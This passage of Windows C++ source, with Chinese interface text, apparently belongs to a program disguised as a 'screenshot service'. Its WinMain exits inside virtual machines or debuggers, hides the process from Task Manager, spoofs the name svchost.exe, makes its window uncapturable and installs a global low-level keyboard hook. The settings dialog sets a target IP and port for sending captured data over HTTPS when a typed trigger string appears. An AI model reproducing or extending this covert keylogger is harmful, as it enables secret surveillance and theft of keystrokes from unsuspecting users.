            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            345, 348, 150, 26, hWnd, (HMENU)(IDC_NEW_TRIGGER + 2), NULL, NULL);
        SendMessageW(hSendTriggerEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        
        HWND hTargetIPLabel = CreateWindowW(L"STATIC", L"目标IP:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 385, 70, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hTargetIPLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        g_hTargetIPEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            95, 383, 150, 26, hWnd, (HMENU)(IDC_NEW_TRIGGER + 3), NULL, NULL);
        SendMessageW(g_hTargetIPEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        
        HWND hTargetPortLabel = CreateWindowW(L"STATIC", L"端口:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            255, 385, 50, 22, hWnd, NULL, NULL, NULL);
        SendMessageW(hTargetPortLabel, WM_SETFONT, (WPARAM)g_hFont, TRUE);
        
        g_hTargetPortEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            300, 383, 80, 26, hWnd, (HMENU)(IDC_NEW_TRIGGER + 4), NULL, NULL);
        SendMessageW(g_hTargetPortEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        
        HWND hSaveSendBtn = CreateWindowW(L"BUTTON", L"保存设置",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            390, 382, 90, 28, hWnd, (HMENU)(IDC_SAVE_BTN + 1), NULL, NULL);
        SendMessageW(hSaveSendBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        
        HWND hSendHint = CreateWindowW(L"STATIC", L"说明: 清空/发送触发字符串在任意界面输入即可触发，发送按时间顺序通过HTTPS传输",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            25, 418, 540, 18, hWnd, NULL, NULL, NULL);
        SendMessageW(hSendHint, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);
        
        SendMessageW(g_hPathEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        SendMessageW(hBrowseBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        SendMessageW(hSaveBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        SendMessageW(g_hStatusText, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        SendMessageW(g_hHotkeyEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        SendMessageW(hSetHotkeyBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        SendMessageW(g_hNewTriggerEdit, WM_SETFONT, (WPARAM)g_hStatusFont, TRUE);
        SendMessageW(hAddTriggerBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        SendMessageW(hDelTriggerBtn, WM_SETFONT, (WPARAM)g_hFontBold, TRUE);
        
        LoadConfig();
        if (!g_customPath.empty()) {
            SetWindowTextW(g_hPathEdit, g_customPath.c_str());
        }
        SetWindowTextW(g_hHotkeyEdit, g_screenshotHotkey.c_str());
        
        for (const auto& trigger : g_triggerStrings) {
            if (!trigger.empty()) {
                SendMessageW(g_hTriggerList, LB_ADDSTRING, 0, (LPARAM)trigger.c_str());
            }
        }
        if (SendMessageW(g_hTriggerList, LB_GETCOUNT, 0, 0) == 0) {
            SendMessageW(g_hTriggerList, LB_ADDSTRING, 0, (LPARAM)L"");
        }
        
        SetWindowTextW(hClearTriggerEdit, g_clearTrigger.c_str());
        SetWindowTextW(hSendTriggerEdit, g_sendTrigger.c_str());
        SetWindowTextW(g_hTargetIPEdit, g_targetIP.c_str());
        wchar_t portStr[32];
        swprintf(portStr, 32, L"%d", g_targetPort);
        SetWindowTextW(g_hTargetPortEdit, portStr);
        
        return 0;
    }
    case WM_CTLCOLORSTATIC:
    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        SetTextColor(hdc, RGB(0, 220, 255));
        SetBkColor(hdc, RGB(20, 30, 48));
        return (LRESULT)g_hEditBrush;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        
        RECT rc;
        GetClientRect(hWnd, &rc);
        FillRect(hdc, &rc, g_hBgBrush);
        
        HPEN oldPen = (HPEN)SelectObject(hdc, g_hBorderPen);
        HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, g_hPanelBrush);
        Rectangle(hdc, 15, 50, 585, 150);
        Rectangle(hdc, 15, 155, 585, 335);
        Rectangle(hdc, 15, 340, 585, 440);
        
        SelectObject(hdc, g_hGlowPen);
        MoveToEx(hdc, 15, 50, NULL);
        LineTo(hdc, 585, 50);
        MoveToEx(hdc, 15, 155, NULL);
        LineTo(hdc, 585, 155);
        MoveToEx(hdc, 15, 340, NULL);
        LineTo(hdc, 585, 340);
        
        SelectObject(hdc, oldPen);
        SelectObject(hdc, oldBrush);
        
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_BROWSE_BTN) {
            BROWSEINFOW bi = {0};
            bi.hwndOwner = hWnd;
            bi.lpszTitle = L"选择截图保存路径";
            bi.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;
            
            LPITEMIDLIST pidl = SHBrowseForFolderW(&bi);
            if (pidl != NULL) {
                wchar_t path[MAX_PATH];
                if (SHGetPathFromIDListW(pidl, path)) {
                    SetWindowTextW(g_hPathEdit, path);
                    g_customPath = path;
                }
                CoTaskMemFree(pidl);
            }
        } else if (LOWORD(wParam) == IDC_SAVE_BTN) {
            wchar_t path[MAX_PATH];
            GetWindowTextW(g_hPathEdit, path, MAX_PATH);
            g_customPath = path;
            SaveConfig();
            CreateScreenshotDir(g_customPath);
            MessageBoxW(hWnd, L"保存路径已更新", L"提示", MB_OK | MB_ICONINFORMATION);
        } else if (LOWORD(wParam) == IDC_SET_HOTKEY) {
            wchar_t hk[MAX_PATH];
            GetWindowTextW(g_hHotkeyEdit, hk, MAX_PATH);
            g_screenshotHotkey = hk;
            SaveConfig();
            MessageBoxW(hWnd, L"热键已设置，重启生效", L"提示", MB_OK | MB_ICONINFORMATION);
        } else if (LOWORD(wParam) == IDC_ADD_TRIGGER) {
            wchar_t trigger[MAX_PATH];
            GetWindowTextW(g_hNewTriggerEdit, trigger, MAX_PATH);
            std::wstring triggerStr(trigger);
            if (!triggerStr.empty()) {
                g_triggerStrings.push_back(triggerStr);
                SendMessageW(g_hTriggerList, LB_ADDSTRING, 0, (LPARAM)triggerStr.c_str());
                SetWindowTextW(g_hNewTriggerEdit, L"");
                SaveConfig();
                wchar_t msg[256];
                swprintf(msg, 256, L"已添加触发字符串: %s", triggerStr.c_str());
                UpdateStatus(msg);
            }
        } else if (LOWORD(wParam) == IDC_DEL_TRIGGER) {
            int selIdx = (int)SendMessageW(g_hTriggerList, LB_GETCURSEL, 0, 0);
            if (selIdx != LB_ERR) {
                wchar_t itemText[MAX_PATH];
                SendMessageW(g_hTriggerList, LB_GETTEXT, (WPARAM)selIdx, (LPARAM)itemText);
                SendMessageW(g_hTriggerList, LB_DELETESTRING, (WPARAM)selIdx, 0);
                
                for (auto it = g_triggerStrings.begin(); it != g_triggerStrings.end(); ++it) {
                    if (*it == itemText) {
                        g_triggerStrings.erase(it);
                        break;
                    }
                }
                SaveConfig();
                UpdateStatus(L"已删除触发字符串");
            }
        } else if (LOWORD(wParam) == IDC_SAVE_BTN + 1) {
            wchar_t clearTr[MAX_PATH];
            GetWindowTextW(GetDlgItem(hWnd, IDC_NEW_TRIGGER + 1), clearTr, MAX_PATH);
            g_clearTrigger = clearTr;
            
            wchar_t sendTr[MAX_PATH];
            GetWindowTextW(GetDlgItem(hWnd, IDC_NEW_TRIGGER + 2), sendTr, MAX_PATH);
            g_sendTrigger = sendTr;
            
            wchar_t ip[MAX_PATH];
            GetWindowTextW(g_hTargetIPEdit, ip, MAX_PATH);
            g_targetIP = ip;
            
            wchar_t portStr[32];
            GetWindowTextW(g_hTargetPortEdit, portStr, 32);
            g_targetPort = std::stoi(portStr);
            
            SaveConfig();
            MessageBoxW(hWnd, L"发送设置已保存", L"提示", MB_OK | MB_ICONINFORMATION);
            UpdateStatus(L"发送设置已保存");
        }
        return 0;
    case WM_HOTKEY: {
        int id = (int)wParam;
        
        if (id == HOTKEY_SCREENSHOT) {
            OnScreenshotHotkey();
        } else if (id == HOTKEY_QUIT) {
            DestroyWindow(hWnd);
        } else if (id == HOTKEY_TOGGLE_VIS) {
            ToggleVisibility();
        } else if (id == HOTKEY_LOCK) {
            if (g_isVisible) {
                LockApp();
            }
        } else if (id == HOTKEY_MOVE_UP) {
            MoveWindowBy(0, -10);
        } else if (id == HOTKEY_MOVE_DOWN) {
            MoveWindowBy(0, 10);
        } else if (id == HOTKEY_MOVE_LEFT) {
            MoveWindowBy(-10, 0);
        } else if (id == HOTKEY_MOVE_RIGHT) {
            MoveWindowBy(10, 0);
        }
        return 0;
    }
    case WM_CLOSE:
        DestroyWindow(hWnd);
        return 0;
    case WM_DESTROY:
        UnregisterHotKey(hWnd, HOTKEY_TOGGLE_VIS);
        UnregisterHotKey(hWnd, HOTKEY_LOCK);
        UnregisterHotKey(hWnd, HOTKEY_MOVE_UP);
        UnregisterHotKey(hWnd, HOTKEY_MOVE_DOWN);
        UnregisterHotKey(hWnd, HOTKEY_MOVE_LEFT);
        UnregisterHotKey(hWnd, HOTKEY_MOVE_RIGHT);
        if (g_hBgBrush) DeleteObject(g_hBgBrush);
        if (g_hPanelBrush) DeleteObject(g_hPanelBrush);
        if (g_hEditBrush) DeleteObject(g_hEditBrush);
        if (g_hBtnBrush) DeleteObject(g_hBtnBrush);
        if (g_hBtnHoverBrush) DeleteObject(g_hBtnHoverBrush);
        if (g_hFont) DeleteObject(g_hFont);
        if (g_hFontBold) DeleteObject(g_hFontBold);
        if (g_hFontLarge) DeleteObject(g_hFontLarge);
        if (g_hStatusFont) DeleteObject(g_hStatusFont);
        if (g_hSmallFont) DeleteObject(g_hSmallFont);
        if (g_hBorderPen) DeleteObject(g_hBorderPen);
        if (g_hGlowPen) DeleteObject(g_hGlowPen);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    if (stealth::IsRunningInVM()) return 1;
    if (stealth::IsBeingDebugged()) return 1;
    stealth::AntiDebug_Init();
    stealth::HideFromTaskManager();
    stealth::SpoofProcessName(L"svchost.exe");

    g_hInstance = hInstance;

    LoadConfig();
    CreateScreenshotDir(g_customPath);

    InitializeCriticalSection(&g_fileLock);
    InitializeCriticalSection(&g_lockBufLock);
    InitializeCriticalSection(&g_keyBufLock);

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpszClassName = L"ScreenshotSvcClass";
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassW(&wc);

    int ww = 600, wh = 470;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    g_hWnd = CreateWindowExW(WS_EX_TOOLWINDOW, L"ScreenshotSvcClass",
        L"截屏服务",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        (sw - ww) / 2, (sh - wh) / 2, ww, wh,
        NULL, NULL, hInstance, NULL);

    if (!g_hWnd) {
        MessageBoxW(NULL, L"窗口创建失败", L"错误", MB_OK | MB_ICONERROR);
        return 1;
    }

    ShowWindow(g_hWnd, SW_SHOW);
    UpdateWindow(g_hWnd);
    
    stealth::MakeWindowUncapturable(g_hWnd);

    g_watcherRunning = true;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FileWatcherThread, NULL, 0, NULL);

    hotkey::HotkeyManager hotkeyMgr;
    
    if (!hotkeyMgr.Register(g_hWnd, HOTKEY_SCREENSHOT, MOD_CONTROL | MOD_SHIFT, 'P', OnScreenshotHotkey)) {
        MessageBoxW(g_hWnd, L"热键注册失败: Ctrl+Shift+P 已被其他程序占用", L"警告", MB_OK | MB_ICONWARNING);
    }
    
    hotkeyMgr.Register(g_hWnd, HOTKEY_QUIT, MOD_CONTROL | MOD_SHIFT, 'Q', []() {
        if (g_hWnd) PostMessageW(g_hWnd, WM_CLOSE, 0, 0);
    });

    RegisterHotKey(g_hWnd, HOTKEY_TOGGLE_VIS, MOD_CONTROL, 'H');
    RegisterHotKey(g_hWnd, HOTKEY_LOCK, MOD_CONTROL, 'L');
    RegisterHotKey(g_hWnd, HOTKEY_MOVE_UP, MOD_CONTROL, VK_UP);
    RegisterHotKey(g_hWnd, HOTKEY_MOVE_DOWN, MOD_CONTROL, VK_DOWN);
    RegisterHotKey(g_hWnd, HOTKEY_MOVE_LEFT, MOD_CONTROL, VK_LEFT);
    RegisterHotKey(g_hWnd, HOTKEY_MOVE_RIGHT, MOD_CONTROL, VK_RIGHT);

    g_hKbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInstance, 0);

    CreateThread(NULL, 0, HookMonitorThread, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hKbdHook) UnhookWindowsHookEx(g_hKbdHook);
    g_watcherRunning = false;
    DeleteCriticalSection(&g_fileLock);
    DeleteCriticalSection(&g_lockBufLock);
    DeleteCriticalSection(&g_keyBufLock);

    return 0;
}
